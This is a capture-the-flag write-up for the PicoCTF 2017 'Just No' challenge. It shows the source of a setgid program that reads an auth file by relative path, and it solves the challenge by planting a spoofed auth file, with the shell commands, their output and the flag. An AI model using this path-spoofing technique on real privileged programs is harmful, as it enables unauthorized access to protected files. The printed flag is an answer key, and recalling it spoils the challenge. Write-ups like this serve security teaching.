# PicoCTF 2017- Level 1 - Binary Exploitation 2

**Title:** Just No  
**Category:** Binary Exploitation  
**Points:** 40  
**Description:**

>A program at /problems/7e8b456c98db60be9a33339ab4509fca has access to a flag but refuses to share it. Can you convince it otherwise?

**Hint:**

>Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

## Solution

First let's navigate to the directory and list the file in it:  
	$ cd  /problems/f49abea6827cafa20a035340d3812d09
	$ ls -l
	total 20
	-rw-r--r-- 1 hacksports just-no_9    2 Mar 31  2017 auth
	-r--r----- 1 hacksports just-no_9   33 Mar 31  2017 flag
	-rwxr-sr-x 1 hacksports just-no_9 7800 Mar 31  2017 justno
	-rw-r--r-- 1 hacksports just-no_9  838 Mar 31  2017 justno.c

As we can see there is a .c file corresponding to the source code of the program "justno". Let's open it:  
```c
#include 
#include 
#include 
#include 
#include 

int main(int argc, char **argv){
  FILE* authf = fopen("../../problems/f49abea6827cafa20a035340d3812d09/auth","r"); //access auth file in ../../../problems/f49abea6827cafa20a035340d3812d09
  if(authf == NULL){
    printf("could not find auth file in ../../problems/f49abea6827cafa20a035340d3812d09/\n");
    return 0;
  }
  char auth[8];
  fgets(auth,8,authf);
  fclose(authf);
  if(strcmp(auth,"no")!=0){
    FILE* flagf;
    flagf = fopen("/problems/f49abea6827cafa20a035340d3812d09/flag","r");
    char flag[64];
    fgets(flag,64,flagf);
    printf("Oh. Well the auth file doesn't say no anymore so... Here's the flag: %s",flag);
    fclose(flagf);
  }else{
    printf("auth file says no. So no. Just... no.\n");
  }
  return 0;
}
```

The trick here is to notice that the fopen function on the second line uses a relative path. The program open an "auth" file and check if there is "no" inside. What we can do is to create our own subfolder and auth file:  
	$ mkdir -p ~/problems/f49abea6827cafa20a035340d3812d09/
	$ echo "yes" > ~/problems/f49abea6827cafa20a035340d3812d09/auth
	$ cd ~/problems/f49abea6827cafa20a035340d3812d09/
	$ /problems/f49abea6827cafa20a035340d3812d09/justno
	Oh. Well the auth file doesn't say no anymore so... Here's the flag: 6882905ccde9eeceac01f98cb0260fc2

The flag is `6882905ccde9eeceac01f98cb0260fc2`